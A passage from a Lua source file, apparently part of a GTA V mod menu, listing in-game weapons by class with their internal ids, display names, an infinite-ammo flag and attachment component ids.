                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_PI_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_MICROSMG_VARMOD_LUXE"}}
            }
        },
        SMG = {
            id = "weapon_smg",
            name = "SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_SMG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_SMG_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_SMG_CLIP_03"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MACRO_02"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_SMG_VARMOD_LUXE"}}
            }
        },
        SMGMkII = {
            id = "weapon_smg_mk2",
            name = "SMG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_SMG_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_SMG_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_SB_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_SB_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"},
                    {name = '<font color="#66666A">Flat Muzzle Brake', id = "COMPONENT_AT_MUZZLE_01"},
                    {name = '<font color="#66666A">Tactical Muzzle Brake', id = "COMPONENT_AT_MUZZLE_02"},
                    {name = '<font color="#66666A">Fat-End Muzzle Brake', id = "COMPONENT_AT_MUZZLE_03"},
                    {name = '<font color="#66666A">Precision Muzzle Brake', id = "COMPONENT_AT_MUZZLE_04"},
                    {name = '<font color="#66666A">Heavy Duty Muzzle Brake', id = "COMPONENT_AT_MUZZLE_05"},
                    {name = '<font color="#66666A">Slanted Muzzle Brake', id = "COMPONENT_AT_MUZZLE_06"},
                    {name = '<font color="#66666A">Split-End Muzzle Brake', id = "COMPONENT_AT_MUZZLE_07"}
                }
            }
        },
        AssaultSMG = {
            id = "weapon_assaultsmg",
            name = "Assault SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_ASSAULTSMG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_ASSAULTSMG_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_ASSAULTSMG_VARMOD_LOWRIDER"}}
            }
        },
        CombatPDW = {
            id = "weapon_combatpdw",
            name = "Combat PDW",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_COMBATPDW_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_COMBATPDW_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_COMBATPDW_CLIP_03"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MachinePistol = {
            id = "weapon_machinepistol",
            name = "Machine Pistol ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_MACHINEPISTOL_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_MACHINEPISTOL_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_MACHINEPISTOL_CLIP_03"}
                },
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        MiniSMG = {
            id = "weapon_minismg",
            name = "Mini SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_MINISMG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_MINISMG_CLIP_02"}
                }
            }
        },
        UnholyHellbringer = {id = "weapon_raycarbine", name = "Unholy Hellbringer", bInfAmmo = false, mods = {}}
    },
    Shotguns = {
        PumpShotgun = {
            id = "weapon_pumpshotgun",
            name = "Pump Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
				BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_SR_SUPP"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_PUMPSHOTGUN_VARMOD_LOWRIDER"}}
            }
        },
        PumpShotgunMkII = {
            id = "weapon_pumpshotgun_mk2",
            name = "Pump Shotgun Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},
                    {name = "Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},
                    {name = "Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},
                    {name = "Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},
                    {name = "Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"}
                }
            }
        },
        SawedOffShotgun = {id = "weapon_sawnoffshotgun", name = "Sawed-Off Shotgun", bInfAmmo = false, mods = {}},
        AssaultShotgun = {
            id = "weapon_assaultshotgun",
            name = "Assault Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupShotgun = {
            id = "weapon_bullpupshotgun",
            name = "Bullpup Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        Musket = {id = "weapon_musket", name = "Musket", bInfAmmo = false, mods = {}},
        HeavyShotgun = {
            id = "weapon_heavyshotgun",
            name = "Heavy Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        DoubleBarrelShotgun = {id = "weapon_dbshotgun", name = "Double Barrel Shotgun", bInfAmmo = false, mods = {}},
        SweeperShotgun = {id = "weapon_autoshotgun", name = "Sweeper Shotgun", bInfAmmo = false, mods = {}}
    },
    AssaultRifles = {
        AssaultRifle = {
            id = "weapon_assaultrifle",
            name = "Assault Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_ASSAULTRIFLE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_ASSAULTRIFLE_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_ASSAULTRIFLE_CLIP_03"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}},
				Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_ASSAULTRIFLE_VARMOD_LUXE"}}
            }
        },
        AssaultRifleMkII = {
            id = "weapon_assaultrifle_mk2",
            name = "Assault Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_AR_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_AR_BARREL_0"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        CarbineRifle = {
            id = "weapon_carbinerifle",
            name = "Carbine Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_CARBINERIFLE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_CARBINERIFLE_CLIP_02"},
                    {name = "Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"}},
				Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}},
				Luxury = {{name = '<font color="#66666A">Lux Skin', id = "COMPONENT_CARBINERIFLE_VARMOD_LUXE"}}
            }
        },
        CarbineRifleMkII = {
            id = "weapon_carbinerifle_mk2",
            name = "Carbine Rifle Mk II ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_CR_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_CR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        AdvancedRifle = {
            id = "weapon_advancedrifle",
            name = "Advanced Rifle ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"}}
            }
        },
        SpecialCarbine = {
            id = "weapon_specialcarbine",
            name = "Special Carbine",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_SPECIALCARBINE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_SPECIALCARBINE_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_SPECIALCARBINE_CLIP_03"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        SpecialCarbineMkII = {
            id = "weapon_specialcarbine_mk2",
            name = "Special Carbine Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_SC_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_SC_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        BullpupRifle = {
            id = "weapon_bullpuprifle",
            name = "Bullpup Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_BULLPUPRIFLE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_BULLPUPRIFLE_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupRifleMkII = {
            id = "weapon_bullpuprifle_mk2",
            name = "Bullpup Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_BP_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_BP_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CompactRifle = {
            id = "weapon_compactrifle",
            name = "Compact Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_COMPACTRIFLE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_COMPACTRIFLE_CLIP_02"},
                    {name = '<font color="#66666A">Drum Magazine', id = "COMPONENT_COMPACTRIFLE_CLIP_03"}
                }
            }
        }
    },
    LMG = {
        MG = {
            id = "weapon_mg",
            name = "MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_MG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_MG_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_SMALL_02"}}
            }
        },
        CombatMG = {
            id = "weapon_combatmg",
            name = "Combat MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_COMBATMG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_COMBATMG_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CombatMGMkII = {
            id = "weapon_combatmg_mk2",
            name = "Combat MG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_COMBATMG_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_COMBATMG_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_MG_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_MG_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        GusenbergSweeper = {
            id = "weapon_gusenberg",
            name = "GusenbergSweeper",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_GUSENBERG_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_GUSENBERG_CLIP_02"}
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = "weapon_sniperrifle",
            name = "Sniper Rifle",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                },
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        HeavySniper = {
            id = "weapon_heavysniper",
            name = "Heavy Sniper",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                }
            }
        },
        HeavySniperMkII = {
            id = "weapon_heavysniper_mk2",
            name = "Heavy Sniper Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},
                    {name = "Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},
                    {name = "Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},
                    {name = "Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"},
                    {name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"},
                    {name = "Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"},
                    {name = "Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"}
                },
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_SR_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_SR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"},
                    {name = "Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"}
                }
            }
        },
        MarksmanRifle = {
            id = "weapon_marksmanrifle",
            name = "Marksman Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = '<font color="#66666A">Default Magazine', id = "COMPONENT_MARKSMANRIFLE_CLIP_01"},
                    {name = '<font color="#66666A">Extended Magazine', id = "COMPONENT_MARKSMANRIFLE_CLIP_02"}
                },
                Sights = {{name = '<font color="#66666A">Scope', id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},
                Flashlight = {{name = '<font color="#66666A">Flashlight', id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = '<font color="#66666A">Suppressor', id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MarksmanRifleMkII = {
            id = "weapon_marksmanrifle_mk2",
            name = "Marksman Rifle Mk II",
